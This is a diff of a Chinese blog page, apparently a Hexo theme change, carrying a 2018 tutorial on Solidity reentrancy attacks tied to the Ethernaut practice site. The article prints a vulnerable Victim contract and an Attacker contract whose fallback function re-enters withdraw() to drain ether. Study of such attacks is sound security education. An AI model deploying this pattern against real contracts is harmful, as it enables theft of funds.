@@ -1,21 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-
-    <!--[if lt IE 9]>
-        <style>body {display: none; background: none !important} </style>
-        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
-    <![endif]-->
-
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="format-detection" content="telephone=no" />
-<meta name="author" content="LaLa" />
-
-
-
-<meta name="description" content="— 有意思，填一小块坑 —">
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="— 有意思，填一小块坑 —">
 <meta name="keywords" content="区块链,solidity,安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="智能合约安全-重入攻击">
@@ -36,302 +27,143 @@
 <meta name="twitter:title" content="智能合约安全-重入攻击">
 <meta name="twitter:description" content="— 有意思，填一小块坑 —">
 <meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1opdicj309w065q2v.jpg">
-
-<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
-
-
-    <link rel="alternate" href="/atom.xml" title="啦啦菌NODE" type="application/atom+xml">
-
-
-
-    <link rel="shortcut icon" href="/favicon.png">
-
-
-
-    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
-
-
-
-    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
-
-
-
-    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
-    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
-
-
-<link rel="stylesheet" href="/css/style.css">
-
-
-
-<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-
-
-<title>智能合约安全-重入攻击 | 啦啦菌NODE</title>
-
-<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-
-<script>
-    var yiliaConfig = {
-        fancybox: true,
-        animate: true,
-        isHome: false,
-        isPost: true,
-        isArchive: false,
-        isTag: false,
-        isCategory: false,
-        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
-        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
-        search: true
-    }
-</script>
-
-
-    <script> yiliaConfig.jquery_ui = [false]; </script>
-
-
-
-    <script> yiliaConfig.rootUrl = "\/";</script>
-
-
-
-
-
-
-</head>
-<body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/">LaLa</a></h1>
-        </hgroup>
-
-        
-
-        
-            <form id="search-form">
-            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
-            <i class="fa fa-times" onclick="resetSearch()"></i>
-            </form>
-            <div id="local-search-result"></div>
-            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
-        
-
-
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                    
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
-                </div>
-            </div>
-        
-
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a href="/">主页</a></li>
-                        
-                            <li><a href="/archives/">所有文章</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day漏洞/">0day漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DAPP/">DAPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NEO/">NEO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/solidity/">solidity</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/">比特币</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/血泪教训/">血泪教训</a></li></ul>
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://stella9527.github.io/">9527</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://blog.betamao.me/">betamao_now</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://betamaois.github.io">betamao</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://err0rzz.github.io">壮壮</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://qianfei11.github.io/">feifan</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://esebanana.github.io">ESE</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://hhddj.github.io/">hhd</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0kami</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://b3t4m3ee.github.io/">b3t4m3ee</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">leavesong</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://iamstudy.cnblogs.com/">l3m0n</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://myblackmanba.github.io/">MyBlackManba</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
-                    
-                    </div>
-                </section>
-                
-
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">biubiubiubiu～&lt;br&gt;动感光波！&lt;br&gt;&lt;br&gt;晚安～</div>
-                </section>
-                
-            </div>
-        </div>
-    </header>                
-</div>
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LaLa</a></h1>
-      </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">LaLa</a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a href="/">主页</a></li>
-                
-                    <li><a href="/archives/">所有文章</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" target="_blank" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" target="_blank" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-            </nav>
-        </header>                
-    </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
-</nav>
-      <div class="body-wrap"><article id="post-智能合约安全-重入攻击" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/08/29/智能合约安全-重入攻击/" class="article-date">
-      <time datetime="2018-08-29T09:05:28.000Z" itemprop="datePublished">2018-08-29</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
         
-  
-    <h1 class="article-title" itemprop="name">
-      智能合约安全-重入攻击
-    </h1>
-  
-
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-
-        
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/solidity/">solidity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/区块链/">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
-    </div>
-
-        <div class="clearfix"></div>
-      </div>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
           
-        <p>— 有意思，填一小块坑 —</p>
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>智能合约安全-重入攻击</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/25/浏览器渲染原理与编码解码/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&text=智能合约安全-重入攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&is_video=false&description=智能合约安全-重入攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全-重入攻击&body=Check out this article: http://lalajun.com/2018/08/29/智能合约安全-重入攻击/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&name=智能合约安全-重入攻击&description=&lt;p&gt;— 有意思，填一小块坑 —&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重入攻击"><span class="toc-number">2.</span> <span class="toc-text">重入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#因-Fallback、足够Gas-重入"><span class="toc-number">2.1.</span> <span class="toc-text">因 Fallback、足够Gas 重入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写攻击合约"><span class="toc-number">2.2.</span> <span class="toc-text">编写攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资产记录的修改在转币之后"><span class="toc-number">2.3.</span> <span class="toc-text">资产记录的修改在转币之后</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ethernaut重入题"><span class="toc-number">3.</span> <span class="toc-text">ethernaut重入题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于Remix"><span class="toc-number">3.1.</span> <span class="toc-text">基于Remix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于truffle-本地测试"><span class="toc-number">3.2.</span> <span class="toc-text">基于truffle 本地测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        智能合约安全-重入攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">啦啦菌NODE</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-08-29T09:05:28.000Z" itemprop="datePublished">2018-08-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/solidity/">solidity</a>, <a class="tag-link" href="/tags/区块链/">区块链</a>, <a class="tag-link" href="/tags/安全/">安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>— 有意思，填一小块坑 —</p>
 <a id="more"></a>
 <hr>
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直挖着关于智能合约安全问题的坑放在自己的博客列表里，包括什么RPC20代币啦，智能合约函数使用啦，巴拉巴拉。但是一直整块时间去整理。</p>
-<p>今天知道了个有意思的跟CTF题目一样的<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">智能合约漏洞合集网站</a>。做了其中重入攻击的部分。很有意思，还尝试用了下Remix。之后考虑把它刷完。</p>
+<p>今天知道了个有意思的跟CTF题目一样的<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">智能合约漏洞合集网站</a>。做了其中重入攻击的部分。很有意思，还尝试用了下Remix。之后考虑把它刷完。</p>
 <p>那么回归重点。</p>
 <hr>
 
@@ -343,13 +175,13 @@
 <li>为什么attack重入了victim，就会导致漏洞。</li>
 </ul>
 <p>先解决第一个问题，为什么会重入？</p>
-<h2 id="因-Fallback、足够Gas-重入"><a href="#因-Fallback、足够Gas-重入" class="headerlink" title="因 Fallback、足够Gas 重入"></a>因 Fallback、足够Gas 重入</h2><p>受害者合约<code>Victim.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</div><div class="line"></div><div class="line">contract Victim &#123;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    uint transferAmt = <span class="number">1</span> ether; </div><div class="line">    <span class="keyword">if</span> (!msg.sender.call.value(transferAmt)()) <span class="keyword">throw</span>; </div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="因-Fallback、足够Gas-重入"><a href="#因-Fallback、足够Gas-重入" class="headerlink" title="因 Fallback、足够Gas 重入"></a>因 Fallback、足够Gas 重入</h2><p>受害者合约<code>Victim.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"></span><br><span class="line">contract Victim &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    uint transferAmt = <span class="number">1</span> ether; </span><br><span class="line">    <span class="keyword">if</span> (!msg.sender.call.value(transferAmt)()) <span class="keyword">throw</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>以上是一个典型的会导致重入的智能合约。</p>
 <p><code>withdraw</code>函数完成了存储在Victim合约中的代币的撤回功能。调用一次，就会转账<code>1 ether</code>到调用者用户。此处的重入攻击会导致调用一次<code>withdraw()</code>转出不只<code>1 ether</code>的钱。<br>（虽然来说这个合约，攻击者完全可以多次调用withdraw来慢慢转钱，但是只是为了演示的智能合约，不用太计较）</p>
 <p>关键原因就是使用<code>call.value()</code>转账，但在此之前需要了解一下<strong>Fallback函数</strong></p>
 <p>首先我们要知道，转账是可以转钱到一个智能合约地址或者一个账户地址。这两个是有所区别的————Fallback函数</p>
 <blockquote>
-<p>合约可以有一个未命名的函数————<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html#fallback" target="_blank" rel="external">Fallback函数</a>。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p>
+<p>合约可以有一个未命名的函数————<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html#fallback" target="_blank" rel="noopener">Fallback函数</a>。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p>
 <p>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。</p>
 <p>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p>
 </blockquote>
@@ -362,12 +194,12 @@
 <p>可以看出<code>call.value</code>与<code>transfer</code>和<code>send</code>不同，会发送目前拥有的全部的gas，从而使智能合约有足够的gas不断重入。</p>
 <h2 id="编写攻击合约"><a href="#编写攻击合约" class="headerlink" title="编写攻击合约"></a>编写攻击合约</h2><p>那么在攻击合约中使用<strong>payable fallback函数</strong>配合受害合约的转账函数发送全部的Gas。我们就可以有足够的Gas去执行自己的代码————重入。</p>
 <p>在payable fallback函数中，我们选择继续调用受害者合约的<code>withdraw()</code>,再配合一些控制就可以任意通过一次调用，转账出任意多的代币。</p>
-<p><code>attack.sol</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</div><div class="line"><span class="comment">//引入受害合约</span></div><div class="line"><span class="keyword">import</span> <span class="string">'./Victim.sol'</span>;</div><div class="line"><span class="comment">//攻击</span></div><div class="line">contract Attacker &#123;</div><div class="line">  <span class="comment">//受害合约实例</span></div><div class="line">  Victim v;</div><div class="line">  <span class="comment">//重入次数</span></div><div class="line">  uint public count;</div><div class="line">  <span class="comment">//日志</span></div><div class="line">  event LogFallback(uint c, uint balance);</div><div class="line">  <span class="comment">//初始化函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params">address victim</span>) </span>&#123;</div><div class="line">    v = Victim(victim);</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//攻击函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    v.withdraw();</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//payable fallback函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</div><div class="line">    count++;</div><div class="line">    <span class="comment">//记录日志</span></div><div class="line">    LogFallback(count, <span class="keyword">this</span>.balance);</div><div class="line">    <span class="comment">//限制转出10个代币</span></div><div class="line">    <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</div><div class="line">      v.withdraw();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>attack.sol</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"><span class="comment">//引入受害合约</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./Victim.sol'</span>;</span><br><span class="line"><span class="comment">//攻击</span></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">  <span class="comment">//受害合约实例</span></span><br><span class="line">  Victim v;</span><br><span class="line">  <span class="comment">//重入次数</span></span><br><span class="line">  uint public count;</span><br><span class="line">  <span class="comment">//日志</span></span><br><span class="line">  event LogFallback(uint c, uint balance);</span><br><span class="line">  <span class="comment">//初始化函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params">address victim</span>) </span>&#123;</span><br><span class="line">    v = Victim(victim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//攻击函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    v.withdraw();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//payable fallback函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="comment">//记录日志</span></span><br><span class="line">    LogFallback(count, <span class="keyword">this</span>.balance);</span><br><span class="line">    <span class="comment">//限制转出10个代币</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</span><br><span class="line">      v.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这样子，只需要攻击函数的attack()，我们就可以得到10个ether</p>
 <p>当然，我们目前做的看起来没有意义。我们只是解决了第一个问题：attack(攻击者合约)如何重入victim(受害者合约)？</p>
 <p>那么为什么attack重入了victim，就会导致漏洞转钱很多次？真实情况可不会向之前的合约一样，调用一次就返回给你钱。你调用很多次，就给你很多钱。肯定会有所限制。</p>
-<h2 id="资产记录的修改在转币之后"><a href="#资产记录的修改在转币之后" class="headerlink" title="资产记录的修改在转币之后"></a>资产记录的修改在转币之后</h2><p>取<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">重入题目</a>部分，这更符合真实的场景，也引入重入攻击另一个重要的形成条件。</p>
